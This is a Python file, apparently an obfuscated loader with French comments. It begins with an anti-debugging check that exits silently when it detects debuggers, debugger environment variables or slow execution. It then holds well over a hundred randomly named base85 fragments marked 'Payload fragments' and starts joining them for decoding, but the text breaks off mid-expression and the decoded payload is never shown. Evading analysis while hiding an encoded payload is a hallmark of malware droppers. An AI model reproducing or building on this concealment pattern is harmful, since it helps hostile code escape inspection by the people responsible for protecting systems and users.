#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cj4MLu9jEwSrTC = '@1zT+i0EUrtFF#1bhFch0vBrynMVn4iOqD?JP`;%HPb$b7zhsvimvyP_>v8QG>?ReCz'
_cu37nPNnHoRGfM = 'oibB1ILgW#V5dds1I(1tY5GYyt#K%*fpEQ28Z>OYNGb&srH2Br1X}?YmxvsUNR75;%`'
_chuHKZ09h7InyB = 'sVX6_E$}!qcAdwNX&S^Ki<4BZVd0t_<7iw}WgxTRY2+rb)`<of!DWwEJyna54;etb~j'
_ctWn6djr5V2wlQ = '#1mBz%1LwS9v3}nETRJ#tE!P2^E2wx-jU5JNcRFvD`STd*_J31xI`vSVJc_ZR&*IA@)'
_cw3_yMozN38tDu = '1i@4L}h7q*b);BVUh0@&rXfruG_wQ2+ooSJ8g)j3L8KN%MGAO9TAB@Hm#0s{xZ$W|yj'
_c_tOWth8BvH8Qq = 'e@7gH<Fy`-z80jO_fnYina!vLbJ`skM`(DL4`g2eqnbg6>}PJuErM`T2Xc$8J0iOTv?'
_cwThc9LJ8klkQf = '*ep2G$xdgfPFBC1MfSq?P0U<CBl^4ETRLtys^FV{M|ODP<Mg!aIw53{bwBCaSM`BYpg'
_cp6trqcZHc49JX = '029*qGx%P+X39cb}XWqDArgC>SL-><w_kqu&x&ga0X>p0*s%CfP5%P6qFsc4<y+V@~y'
_cuyh08eRo8O46b = 'MnE8YMogmk+ulcAU>p+>N;Hr4SN_<Fv*dk=i>t9CS>ckt<Q!i|F}<P1b4|2<Ua(pB6h'
_cqo3tOFKNKg3Lw = '-_p098T<iR$m8LrsiEjs!4WgR_e@h;4_eTI@PNZ%d$X$t_Fjwx(jf}8`6aIlGwU)9L7'
_clopOBxhi1fW4v = '=GrS>d)=d$dw!y}MsO*a@f?_a)6xwE0r`j_I)dd1t@oyB{Ir}f;l!&f+R!y&xH**(Za'
_czvLRwUw4Zejqd = 'skM^Czi0{BfFns*PX<NN^Bvjj3G^8P~ooP&D&vndu>$>iAg5fjHwIoepEhXX+^7%9eK'
_cqs_Q0ZjCmSHQX = 'L!-3>S-7<i<DSnX0dC0qTME80fPL~ma1G@V30e3Gx{z(!<>`u+;aktM<8k^=E8F|o`L'
_cy2C3kE2gVF9J1 = '2<*qrU)?Nk(#0L9`#4n-RvJK%RafCM?H6Z;lSsiura6!Jw!wLR|3A=rbZdukz*#pCsI'
_cyJMNuk8H42S89 = 'IU{B38&z~&fvnzx_4H*)mxk%dQvWIp_Y1Gz6Eweq#-ZLaM9;H(5l&$)OGyzfV56@eaN'
_ctZr8AbJ_whzB6 = 'y4d%Hx#>wFo!=69wK%ujA5+t}TW0oT3hq8*s=x_Iw7y+9BkZmmUPVq{n~t)_yv|zx!t'
_cwcClB5dXgOOuZ = 'HS==bp7h58nxU`hd6u3#R1w7($oI;=Y@&UCRYen$Cqs5?8B6eN#0ZAgwP<*?Oijb6DU'
_csWF8A6bK2Qsxz = 'jvGAxN1p<gpteW3K%tCd$1R|*uemYnZbHLg;4UB4bjgfh)R`uNclHQ96czo+jybQs>V'
_cqyn7MG9mdKRU6 = '{!&WBZ4-iMG>%k$N2ID<+p}>92TS7LC_QlQ^pLdWME3eX!0;@FVB)%1z<=@IkN5S{>U'
_crBV3ghgg1hasl = '$v^bL3okZ;|NRNj$jIhB~&9JFLA2^qzPMI6<C84bs*QC4qdJ>g~Sx4c^!y+!2sn1L}1'
_cvvwHecFKPQdm3 = 'U{sQXjY!K<IXGD<0~dnX_mKtx4=s~fQzgM}0R#>j-{^AWvs2t4?+Lfutn#CaPg-H1Ag'
_cj941aNpXwtNpw = '+(}w(rQr=TddcWc9oCnR9<n_Dv}5$1}T(9i(ix1@CgMQ6LH0SuaZ_kb?N9k!;n(hZ+!'
_ccO2CbwQQMrFNb = 'IbO52FK}PBGG^Vg9#i>fO_LW!tPD-bxSYMw6CVd6H{aS9KotGtLo<KbWXU$c>qtvxzF'
_cs3wvl2xwn0ek8 = '2DZ=j-H}FWqbwEojN5&xb`W-cH^{@B1zdalGJxjryAI5h}tx;h(KhpuX;`nlcr-{6zP'
_cp8muAIjHZZmbV = 'giSd8J#Y_^x)L}lJJW~dq;)uAlO@=t$XTdwO}b!@sgBgYDM43XHWs3UYYb%_-G{r))('
_cz1avfaIAg9xE4 = '^d7FkUi$K52SKP-!F^y%lk}&cV|IQjr%GYMIV)N6YbYBLPW*JFjSB&Xu$P7XW$iZZi}'
_ctSjpRWkHwFMst = 'G4EyN`?@<ls>K*jX-ZT&#Sv)=8Z@Mi=<30o4FbDXt55Yr0-8zc;nhiOQ75#M!7|_5vr'
_cl3CNyKyqjvBkP = 'E@vqh;TByc+3g+7Wvm*No6)A_|wOoigoFBMUt13rRpZ={QZLob?SlPU-4I2Sx3%T%}*'
_cpe3NGeFGH0VhW = '{c{I5hram%?Ryqwft`<&HF7b3rk4D+e(xYjf<WK&S#rW%B5bSpJ8s0C)pcLrk8?xXb='
_ceoOynv3bcPySJ = 'X3Bqcak<d)1`$y2eb7&mXC!+9Od#1jTtNe?0)$f89`43oQ8)L4G$9)jTAoH)ezUItSs'
_cx_t3bAWdPXi6Z = 'BpW|@tu(LzK%);tdwAa>dhV6<^H3=7s04`2j_7`LQuPcG8yJwR4o)MVHY|i^$&I&Nx_'
_chbUWbfT09tnV8 = '#nEBwF2dsTns$)44qfB7P!{T>g#Lp;ki^;C9;T8a)qX#}EbY*~TID{Ne)23C-vTOR6e'
_cpjecfoQWPiRNY = '%+Pg}g;WdCx<p80MdQkuTQV#Plca5g$-O6n%FLy%|=jN5rW_`*HW&|RSB5GJ0rbv?un'
_claVXsV7BjFxGi = 'w5GBcf)!|!>>r1MHkl~QxQIO6~2Jgw9x+fYo|7Hl9jXDZ$RyTRJ)};uwUc}lu2QBy;-'
_cbZPpd9UsZt8Iw = 'pnCP);t139m87}uAm3-Lh&UId)k|Lo;oT=BPjtxGde9w2=srD(O+$|;GY@&{#Xoe`@v'
_cbMDHhBVk4uCFs = 'y_GaSL?FwrgRIRuGa?30iVSA49mq>qV&o?b^?Bf-v3$IA-bI`3qAk)=ZcX%pO93Y^4C'
_ck2ui9vXJZYHmD = '}WnV!aUr&{^z_#sRW6%aR-=v&9ey&a!*a4p*RY6`%|{b*i)=;+HYg=G`Vo;WR5OiF`6'
_ck4BxXR47TYzv0 = ';p95g->SId`oXhT1XNWhYms=1&bfCn@c>W*<P>dW&I>Hdo##-_U1_+AggNY0dnJ-yB-'
_cjAsE0b3jKOfNV = '7i*c<u!?=RKa)96rdO#FF~?u<3Ial5)7CLj)D_w+341C7lI`dhJqb`sK;yCkj?jch0{'
_ctqGEAGhClv4vD = '<}J!1hf{IfM?iio&X#Lrm3V|On$f=2^NT!yU*s2+3VVJrLw*!frg-GeaCmx$}PH?|dH'
_cdizd5oiGoHf05 = 'C@6?_uv-{xtiT_by?OSJ@XV5%vD6Fev4Sm|IE-%(yFeo2-b{QxUa-Uhi?YtjZ(g-@@h'
_cqsxO_HUegFz7A = 'F*Sc)Ju;hdL&og7aPn){-g%oo#d1-xhF>J(Eh#fUo(cAq1!JMyV}b6Cfgz)0rY~TW6m'
_cfazQ7lPTdpwyG = '#J~A&rr|m!D{AJQIjMst!rS8H3zWUK4Qg-Zj(Xq|3yGRiz)?)2C##0|Geq&2yn`%slG'
_cgSZM2Cqc5vvtg = 'h$+~c2K?4I4lwVDn~;5nuJwmepL%JpM*b9LPAUGG#J?;zV%?GzFk?!@2{+CEBSE0@at'
_clvEtv3tQiF1Bt = 'EhGK^^D!E`fEgxuIq1mbu$L2?1U${@Wf;;_KPWvrG|aaN#K(gPMjODwfCTq6>IR&6@g'
_cgBjbppYJf5VuM = 'Gs%6rc9UJ!AWHTu0;j3L!f1ou^Q9Igcr>?nl{8)9BY_(yY`n1|8by)nC)@!mF#KZv8K'
_clEUaPn6A7LFvh = 'mGWvaCp05UFABrJ(G>aB;Glegw$wwR+p?5UrB7UX2mir4q+E)fu(lG}U{YRc?4{l9p='
_cfdTT74gLKnr3Z = 'tKqOJ{40FwEkEn{q0n_s2E<)?GpHm0!piF&s0Rx4XZDK;wY#wAw9OXnmb0?_CF09ZNw'
_c_RwtXbDOJAdIc = 'G~;&nKr@^9UN{FCJrZ1pfbA$&SF);3t-?D6CH(n1qCy3=^{wKY3fkb_x^8UAcl|*BAc'
_cvN8kcsx_H0MEk = 'wEk7nIaR61X-9V_#m&@ct~17(NI#kzS9tH9m_Ul)GQ)04i%<4T3{!ScoNRKN@&A!*-Q'
_cnL6wLHVy9D5gB = '1>O<85CcU%6zM0sZvE_UO5A2mfLSRc^;_#Rs#6aDMOASe(Spu#!(^o;cZ88Gh5xhlz}'
_cldLv9qD2HzQ4S = 'c#^@x=8$<HxejgLbH}iweUwIzG?ZeoKOp3CS#h2UFit=R2+$aLS<SeYm2^7^W~t;KOM'
_cpGWADok_aSLYP = 'q19vwyh;BNE)Ojo2Y(NWx0Nhq&ULtGqg29C85&n3qVxx7W#_NRp73NaWr2Sgbg`1z5W'
_cucOhesWZldeUh = '&UZZmVYAPJMiErF%MY@RueEr<~dNfY427+{HYyKuW1e%zzKT(aYY$B7n4%gj?bi>Wz6'
_crJURtB0J8MtRH = 'ANI!gSPqY3{#+s<)Sq}o)rJ~#4k>y9#e$KcmT3<?0dx9W!QrucYbijbMubJ`|`CzSeP'
_c_xX50BgWZCAKH = '_L4(rRr4waub|b0<HBZ-Y^Jvegf5hyphH~rjoh?aX-Ih6RE)+K;{_EK+;NvFR{J^k0`'
_cpPq1JyFRtNu0C = 'C`618FCa-lH_pJmV7sB&C|g8xieEm$}%S9%YKY@)|r^pvxoW3PxSZy;TGlukf-Og--6'
_coYHZGDG6wZo1W = '>=nqWXVXHeG%$B^8l%e(EYnm{1=A}1WnB4R+?}O@Aao^jXcy<y)u@j5>(h>#VjiiXz!'
_cwurrtSXtjHWiX = '`P8@^w}9nidqE+>U5-p3lq6GHk(9K+H+z^<=XfD3W3A`jCu$Rd?vK(ToMV0u5A`m>fe'
_cit1Aodyo9PypM = '?sHh5XxegxS*SV8MUZVIazvuR`89wIC1hF%B5g5=0QSC}{o2V?0R_V?q}=2;&oG(lui'
_cdAbMLghs4kycl = 'MzTL>_GFFGb-Mm;hylV5Z&S`KR9hVSu0x?5!_-hQWi@<&BB7+KTFPlUOx;yuq=Xf~k!'
_ctjk6aRxkfcWYL = '9*XJFgHh5f1xTm_7Ij!&C=XO#W899e$vjsW?_#3&6Oi6`2MDeqk@6nA)J;zDSDyRAb2'
_cermNrlQN0MSD8 = '|8eAxiLMRZc1f#E3#6o*)-xk<RDIQ5n)Vu1A*Zwp?9S%xlg#PYnYd196bmWgfEb$vXy'
_cevzUR2g3jGaFI = 'F|lye72^`B2v|=>c+Ngyh>ZuY%jXi*Hlq=cI&+&M~hz`&VyT&YjXFi76sPLfTi%xVna'
_ccvEaJdLB6VVgL = 't0(Hc)YeER*v-UqfT%%TbRE@G`)sSN7qz7L2U6$iL+ywT}B-h=-a0dY$9VG6rlp|21m'
_cqYU296YGMRRoo = 'rPZmcp-XFoo{(IK{<$9g|IT-H6NyWN#a&H#P;3}>7`)=8p%~Nar09t5069B#@io?n)~'
_cmxjmd382SGx4_ = 'ZH);&q#SGOtwknw0zDvSV4@W*jLCvw%Xyb$j6fk`I{{PUXh&t(ZJFNz(gK0AeucwskS'
_cpMzMOijhKsezp = '1>0a3fLL8;MfFZ<X3m>z33C)Wv><h}W(nOxM!rF>Mk*5gT5Yq$6R~T3$A!xH*KA`n`?'
_ccc8h4qsPEMAsI = '#C%gKl^F9$}@r)Qk5e<12aApTEeh!vNZ3~)5yl>l!(C5b_oy1@urdu;J!(HI(Prx^gN'
_cvXcfUZoHsOVgg = 'oDLJ_>^$Scqd)2d;(>V>1i<p5_1VJeurfL}ER`5?aV6a={ab4XFvJrKGk)a;k)-&RjY'
_c_m05zpuekgeCd = 'g}}E_%v;Jq8yNbv2~s)O)^#S7MH~v98v92%bmeVui5{bmNxD|h>ap&~$Ob2~Wx9@u!a'
_cszAGqFrbLzCAY = 'liCZF@JNB;T%$6mBj&q0R=NpEMZ+;rlzLEI>QVs31O{1hLzn_GLc4YWCzi%jDs&hKVy'
_cd87KBNN5v5VGg = 'oMr{U?z6S*@8~UKzVq%52=auX@2Oa`&7xhyAWN4S4z*k#fs1cDY-v_DPdyKlhPWl3aM'
_cst7MWxC3ja_Oe = '(RTnuf8!Kn-8xCVEp<-CSs*pO*sIpxn~mJ7R5I5BQyTEQ{af$)YTZg9hAm(8gNC(+Aa'
_cxoWihrztN1zjq = 'Jcd8ftP@d$j9Gc7MFD9&*qBNo%=pg7FDer(Xt%ctW-C2_lwMc^R+$QAD31os+pztH)A'
_cmz4HmuU64cTgF = 'Pj1Cu)26&SVb!0kc!FQNaDuvpaWMbEl2_A&6DnH;{5#BIv=80q)S{uc{JTmf5^y3AsT'
_cqGnLZ84A14bwO = '6-9T2(-n?zxnw219jPg%!SMg{JXK<wT|V4ZlhJd_WpAi0}<4doQmTpn}M05Xx^=oJ;w'
_cxuWzezqXDFPtO = '!Z?ry>m?ej7SeXE*Y?%fM;MZR?rDj19Dz26?=*~gbvNmd$<R)9#ja*GNeo+0E&qCq{9'
_cxiQ08MAtmVQeS = '(P_$(2jgWbj#CTl=_ph$K9fAHaOs4CH5-9lp8GvZMe5!&ZYS`5nS)>eh5#EQ&<nWOc_'
_cdkFgwQQiXaApt = '`I$kwAQIf+hCvi2ODR0HMim2RjZ6K@(>YA|$s;`5iV<2ce|5y~Wz#5yidt!o_7{=>tG'
_cfUq9mObDRoM9H = 'u@4{dcBtsg)4rF8VHoL^V6TRt|G^e-A?;)sr;tp|p8sqf!JQZcf6G2mtx{R6GaS+A!H'
_cbSalA9LVtgM_i = '4R5w{93{znky+dj794K4;x^U8ftCvyHz)+FPN-*tv@Thj8F9?e9n?2EK()QczF@lU|;'
_ckw3SOtaDxhqWV = 'P=RN~N8vo8Cp|bBWZq{wTkMi1<H&kdhpD$kERtMQ0lhRW4hb)^iIuTVY7G7(vyE3>3#'
_crGRlK3_QG0nIF = 'W@|&Ean@ylaGg`;G^7V)()4Tdf|(Y^sggz2D7%&fIM-QK>v28)y0x{*YQWp@_VfFly`'
_chheeWPkqJQ_Av = 'MeAasVU^d#+^U?C?xoExvsbcE?cxu$gcap?z#U|T8m47vbSEzs^^E3_*hhkNkFazd%#'
_cztSKqPS9eOBLc = 'i4?jY63Tjszy~+NH#9vII=bX&s$?^tM2Taw>Tn3HX;h|fj#i&<Xk-8x1j+r?$ALH(RX'
_cm95z62zZzUhIL = '>K30;pzl@lOXKtCfH%5wLNzdon$V>~gHj_i{{>*&0Bd=1c#!mUrR==OIPz(g8o=#-z$'
_cvLMXOlGTfPCq_ = 'M_N164W@&PvtocZOLRJ7WaXpOKN8nK%%jLAX<7)&XNoIW|i-TKS?RLJhsmK`()0fv0>'
_cmK3BXpLuw4sac = 'P)$i^$_{OAYe-Apf4}+kfy+d@bC5pzj&YB29E^umQBC!@yI)Lr++Mq3XOwFvp%O*+?Y'
_cwha8oQFAKJO7Q = '&kvV=al!ScCLIB>GKd#$velX`hU0nju;wQFjJMvTa`!$ebfhihJ3eCST7(`>ETJ>gz7'
_cpkzwVBNsa2CtT = 'w)njrWs#)Tt6xZb1?V!Eeb|mMp#L2Mbw_gV7nkZ0ET*d4pF!3l64%{tFN?thvyiU}R_'
_csYuzjuT_oPRhV = 'r&glvs<Ka3&4qT+V3P6V3k*of1$}A4im|P}-#7_K!uAD)O%m?w5x#q&l7z^4Fw%VJ-Z'
_cw0wOcvasUFym6 = '6&L{+-GX+b@pi~~Xa;!M|2v=xQ`6%5zJ$k5y3>gMY=^qZfr+)et&&I4%B>2vcY`10DX'
_ctPsnISaPzVPU8 = 'yIsuEK;LKtOcw+MddJuuB&q^S%wArXs&du*iPXfBg?WuYo*jYG#={I3cK2n6?O<W)E|'
_cx9CwYLLs4ENRB = '06`|w~b4DHhZ<J|@!kZrvIFU0mMP22kBb+?oWDDs_V5a;*`46de~R9x?u#{Sgs@2|?w'
_cenR_n_57TdMI1 = 'z<wc@JNQX~Pu9$Tx500$k`^72^&g@J=Fao7wofcedx8!!1C$nkZ6L&Ps3G_Hv>ulG?W'
_cxiL1g8cyDUTOU = '=;+ZI>qT*NL<p7B(t^oM9*BZu54jr(tnI5DmLYYOpH+gAM}2IRE5)nz8F#Gdk^**9^R'
_cld8QUMoxHl_xF = 'vczei3+KlRQJ7!1@$!nw=CtcnFa6aw-Iv!rxnO2h0$wQx~ZrruYnh}cGqDwk<kHu-O&'
_ce_3FscSuqZ01f = 'KU3b(sk_sQ#i+k)o|<|zSW&nr>0CBFT_=GsXST=`UKyQc<+?!aej%}!5olRt?U5-gg0'
_cmPE5sC43jHttw = 'U=p$WdFX)E@9Yv7f~)?zV=u-e}NxTKuU!tr$A=s12CYMgog4{(#GK9ht?P_mjNmTeTn'
_cttMV_h2lEHZ_Y = 'i~Ko!+$a>Q3}_u{u#l1ym6@)g)gS%7SSN^)4*z16D-BchbyD6apN%^RB<+o1P&zP@G%'
_cd3oxytG018xLH = '_NIam}V>Mb!+w12=$vfv}|_8`<{QFei>dywWubLt-$i(~byIz*=Cs@5jBbS;)$+0PnC'
_clRGIriOXSaXAL = 'XJT=<d)j~?4N&@Er`sX9`mEUs6BC0{QGBizUt+Id9;57k=^CXG@Xq{a6rS!}r`1&LLX'
_cfyc1DMOlvwA9y = 'RACz$ruvsetqw2{zq1`MGqS}eB}!;ew&;Ol^~Bb_fvSI2vck9J?2PCMVao@%U1-f;@8'
_ctwnaRekqmAN16 = 'Y|$>!&}m$s{`>oA+T?Llv-AT9`tFI~N<vHl?&Q8*EN>D>sFId=QWkS9`d#%9cGYkKu~'
_cxFzuZpsVrPNto = 'pTMQnjEf-<49s5@+Js5ZWnxJ^@c11LiS3Dw`5s4MIZpt^sWn7^E!*Q8AhP~}6deJM`-'
_csrCQ7jQAeR4xs = 'B?n?q&C@Mn-=`i3Du2>%nvGw?Udc^ahOIXp#sJzfy>zFS$k$n4<hts9DY`T5us)Zgbc'
_ceOmEh6nJf7nj5 = 'Koidl%d`W2BNb~Bb|7Y?)nz-dr@C%#$gQb_@)j$!z-`cGzoNDc_Ng>YAdKm)5F^E_&Q'
_cqrjWafAsdCjuD = 's3Te!v@CJR}&&s`1r(Qa|R)}uZlA(&;M?!++l=|Y-}A*WXZXiZ{{|m$I2UudSNyt6&;'
_csA5WL1LOIA5Gc = '<kRdy&5_3E5oAW`SP;f0Orkhblt+!NLdI|dmWG2fwUY2~lRY`*%%Zg}uR?kX)=&a=zb'
_cjXaZaBlicn_t2 = '9n0(M7D=&CRr&Dlo#wR=0Gn=pg^rbh4z`PhLTgeAs~cpNnl__P$&qLGzNxpXPCgZ;kC'
_cvOExgLz22whqf = 'ZhmK{7h!=NoiIk?0(z=R*j50fYLZD$6`)AE)Qm-KY3;z#Lb5>VqZKfn;NFPoil5r>*3'
_crW9j7BqqIXUCx = 'FoGI)x9xte{N+v_K`E-KE7gxd{zlf9cO7x35j6QTLUbg$rdv)E9-KfV_H=E-Dzn42bP'
_cu1yJhpz5JxRqd = '@xN=&9tW=dkQKbh<&M|en`ZD&nOX;%o}aib^oce*)deGsw`KbD7{a+UqKA88n0nPg$J'
_ckw0Fqco2fXSkR = 'R3VTwGQ`vt3b8@S<xKLPa7up<xkNM@6OONIsgnmcOdobEPb6&Q;dSc9PWg4K^me1b~l'
_cs5aY4r6fDJywL = '&vrO-_me;TFDLunglDAFT8nw<mP6UtJq+oT`Gl-hgTfV*DG38CLk=bDRhz6se~;zQ5*'
_csVnDeCm1BeWvC = 'Xf=!}duW@}4!;TiBRIXbfIb==u8)bA#b}=q1LVPCWEz6~wz<vwIwiN%-ukv(o9wAs%H'
_cbJj5gnvHbvJAL = ';ZN=C%wec#>$nL@4-VFrZMrt+$m4KcE{a_fVU=4A4@t<q9&EEr>ufXMiIyEX~b_{|IU'
_cvZtNqPsKCeom_ = 'KuO!a_^U`NRNcS3@tPQD`LA~!CRd|6KPmbx3G9gM<p_-Z={9UXY|_P{6+?u&Kb+InMC'
_c_aCENKFo3_miW = 'fT?QXxzPsX^p`)hcEo#D-D9W-EMAVu}WfGhqc?`rqHy!DPl#f?P;sjVD90=-FKi`o20'
_can1Cc6GvPOxAd = '<iiB6*yMHt6shYbgbRVul)(7!jiC61fKFw)d9)>_ufPXzD(`Kkj6WLqy|I~m|8lN69a'
_c_jhkYqy9DB8No = '!-E{i2RjTDEuzU{_V}GR-TUud?(7z;XU+)5y0pERBC|D07gQQ~0(IH0*7r1;hlxI0t&'
_cwakqzMhSgZUvJ = '96=s;A(xaxl5$3Qg_+4k@3hY7i_`%oC!h7(0vqw06k5D>wx;DO%wMN6kx5>!me_l`ff'
_cktzJjunZqtc__ = '%Ovqx~$Ff=OP~SzyI8wyu!H(@)H34gy@m6!?c<h)ivd_s1vCAQ_GPuOALShMSG@PFj)'
_cmRbWHvgfmzK1q = 'KssBdVxj1*TQlJPsb^#puJ<P971k2m(J6i5b-NX*x>G*X+;N+-pAna^XJTt$4NWzi^;'
_cbvDkx3rf7BX2W = 'Us96oO@m4|zY@$9baT#%-KMu()4DcnYwrJbT|#n!=nZULtCVNQiHu04;8>FMk9mSsCf'
_ctssxJgpqUo7_K = 'x{AvYPeDLI9|1YWb`{r-rv5V7BrMaA2J-K~@E>w?}i0WK#I6Wy#?d;aQ4dg%2+$-oI?'
_cjoB_Z8U9vWllx = '*>itlvlc>a0ZhyRiIE!rI9Y34Qq~!Rj9<OA$^`fZw^+39`j4f{5UDR`qClp(S8HNc3f'
_cgZP2sJ_RFL38R = 'aAS7{8U~fUwE>5h9d>v(mXK+t6CUJ2R;i^7*{@l9&!PCxhr1=blwGf&WPvcJ$=MwyH1'
_cuJwCFnN4tWdUX = 'h6?7Fdq(01GPA`DBp+?qMw!F3Nvk-v-=ah|K796j?Z9$8W5n0>@$V@i>~Eab6;&`j9%'
_ci8gPbIlHIuSHl = 'BHU29+#2>C+I9C=CwENyGu_4z$uW@B+?h(Betv3=G<0G4@^Vo*F6;Th)~aS0eQgSUw9'
_cqIQAseRIkD76A = '&LhK}%arGgmRD8h!!;BxBeuUCoW7Bg?bRzxi#Tp1w)UR6Y6Ym2p_#0_?eeVBt2n2m{N'
_clt8fDWtTxB6Av = 'Dhitc;JcbC@quvUx{!`@Pq*NJpg01Cb^UWVwQP!8g;M4@8!#5#UHqraMv>{1gApro?$'
_cfWgulQd9XHwZ4 = '4G@SkplmBg_&W|mmNYrA%i`h`JI`bsY&)*>73P4;m=mN-v?c!N*fXhsDGw>ZBdzuN!B'
_ckVZu4JtEVnSuR = 's9`7EJ9JLxkXe-wikjr1eq^F0?GiU??D3K>V?`a2eZ2tB|4fpyi07`$Oicv#?dD?lu`'
_csbiTPOGys76nN = 'fH=?P-YH_7gjHu*nv3+#-RASze}%<igMN0@n4<w(on$~)F-A&f>GqivTgr=!>0JL2-&'
_csWjzpIY6gNwWy = '6rj!@fTeO*X2i5NEC07nsdMxV4*s^8+y6Jy6WS);(s~Ir-FoDfERg!FCC%BdOD7a+Yr'
_cqjCkF4EZMAN_u = 'Sc(}tWPv~BNYJ@ea!fMR22H`5I=jjfw^cawV&}jr*hc~e2>@}BRZ;4wAEUm?5t!#r|8'
_ceA1Oz2Ozq81Ka = 'UrD>d>nJ9a%&c38|jXld@uKQPcPAWup!_GA@}d0%Rw9Yb!G8sb^9{?0C$y9jA+GtndN'
_ca5Lge1qzthJ7S = 'If%W;ygmoe{uiFn@PUkCcJs!l06Pvcj}liGzKda5z}d8^m_>wV6YRf)o}<;j6G+D{xF'
_caA3nZnxPzkI1u = '79!NPzG<3PPq<p<TAe+y%=rt<`1Wxao>zi{UXd=JUvTAVUjcy!NIhs;8`fT;ka2liTe'
_cyKK1QZmPIQ23I = 'g8c*yODu&N0RR{Ey<pH=esKLpV-mc1<K+HP5Beqj8pI64E)5J(PLaG}CvEE?^x$Ip?G'
_cdaOc4xmuhHrZZ = 'Sg-)OCYLOXoP`M3_K8s#pAP9n!puEq%g;`_|ib5aF!q+?|$rXIX9}gsFsNs{Ae_7}oh'
_cfVfTvNjm4jL8p = 'CtCreW%DXz975^pZXReqlk+-zV@mAGC5syD<PLBHcF$w-LIU$wt&91@9zL;7#rSa4bN'
_coO7Vck46xcBDn = 'JOG6HIKdP1qZE>&i?Bi?!elQJz{mL_L!0{C?!n3mOX5SOgkfu}_t7d3|6l0kwQz#mA2'
_ch9OWyr9if6h4D = 'pe9o>Q#QzSt&^nAL}%o)>xQ);HtR!@##>fr64ZYTt)dM*PQc2`ZUhk)meV`GH~2RVoN'
_cvnPdsE8Arr6qv = '(8cL&kyYsmhq)y5zr4J;D;>rz~1sjbKLL45^d>DWd95oj7Vt>}ii6$eT<kgXm)(yzJ_'
_cg0Ey__w871Pn9 = 'rUpbua?bk*im<svN3}|+Y<#30DaIQd+2B=1m!G1S!MP;mAnV$T+HaR%r^pnfiX9XId*'
_cyLjUlogUFGlyI = 'g+qhU%AiXSDX=Nchozo-;@EOWFvmA1w_N0Kzn0nXG*sSn7Eqok*@Y=_2z*kq6CKeFM2'
_clkSqgsl08RVv7 = '}<zaI)MJ!6n2lTW~yr0`$ek9ocUxS{c-iwyvN<@c_%0K$WvOkmL_CI+tcg#)Qnir$<D'
_cas_J9UpF8K1Fs = 'v*<MWJN0sDf&3}RD8W2ktKgnO#y^6sso8OC#GW!yEh_^?&n6bc)M>}>VQAA`syZe;c>'
_cwJpR40z9jT9fo = 'V<Z-iP+$wuT0Qa@lfgTv7g9ot}U0%W6_=_nPfmuX&NCm=R&qlw3e<>HCLP2(&fF-;@O'
_cv7xoss3fA16BG = 's2nR-hDF;DV*;Y8|!fI%QH*Vupkd7XtZJJ>n-=3K<vi_Enu#6{ym8>k1tEI-kwol#zq'
_cxhWhlZsEy7hrN = 'gL9{rW34JXQCU#<j2?>LJ+M=0z(}zfF`jHtb=!NxaBG$=OG6vf=9|3>^;iVrQC>Re+F'
_cmPXhfxmaLH0A7 = 'Kh79yIbz7%eP(0ae_;u|Lam|)l<9)qO<1p'

_pe56KVAo8LG9bY = __import__('base64').b85decode(_cj4MLu9jEwSrTC + _cu37nPNnHoRGfM + _chuHKZ09h7InyB + _ctWn6djr5V2wlQ + _cw3_yMozN38tDu + _c_tOWth8BvH8Qq + _cwThc9LJ8klkQf + _cp6trqcZHc49JX + _cuyh08eRo8O46b + _cqo3tOFKNKg3Lw + _clopOBxhi1fW4v + _czvLRwUw4Zejqd + _cqs_Q0ZjCmSHQX + _cy2C3kE2gVF9J1 + _cyJMNuk8H42S89 + _ctZr8AbJ_whzB6 + _cwcClB5dXgOOuZ + _csWF8A6bK2Qsxz + _cqyn7MG9mdKRU6 + _crBV3ghgg1hasl + _cvvwHecFKPQdm3 + _cj941aNpXwtNpw + _ccO2CbwQQMrFNb + _cs3wvl2xwn0ek8 + _cp8muAIjHZZmbV + _cz1avfaIAg9xE4 + _ctSjpRWkHwFMst + _cl3CNyKyqjvBkP + _cpe3NGeFGH0VhW + _ceoOynv3bcPySJ + _cx_t3bAWdPXi6Z + _chbUWbfT09tnV8 + _cpjecfoQWPiRNY + _claVXsV7BjFxGi + _cbZPpd9UsZt8Iw + _cbMDHhBVk4uCFs + _ck2ui9vXJZYHmD + _ck4BxXR47TYzv0 + _cjAsE0b3jKOfNV + _ctqGEAGhClv4vD + _cdizd5oiGoHf05 + _cqsxO_HUegFz7A + _cfazQ7lPTdpwyG + _cgSZM2Cqc5vvtg + _clvEtv3tQiF1Bt + _cgBjbppYJf5VuM + _clEUaPn6A7LFvh + _cfdTT74gLKnr3Z + _c_RwtXbDOJAdIc + _cvN8kcsx_H0MEk + _cnL6wLHVy9D5gB + _cldLv9qD2HzQ4S + _cpGWADok_aSLYP + _cucOhesWZldeUh + _crJURtB0J8MtRH + _c_xX50BgWZCAKH + _cpPq1JyFRtNu0C + _coYHZGDG6wZo1W + _cwurrtSXtjHWiX + _cit1Aodyo9PypM + _cdAbMLghs4kycl + _ctjk6aRxkfcWYL + _cermNrlQN0MSD8 + _cevzUR2g3jGaFI + _ccvEaJdLB6VVgL + _cqYU296YGMRRoo + _cmxjmd382SGx4_ + _cpMzMOijhKsezp + _ccc8h4qsPEMAsI + _cvXcfUZoHsOVgg + _c_m05zpuekgeCd + _cszAGqFrbLzCAY + _cd87KBNN5v5VGg + _cst7MWxC3ja_Oe + _cxoWihrztN1zjq + _cmz4HmuU64cTgF + _cqGnLZ84A14bwO + _cxuWzezqXDFPtO + 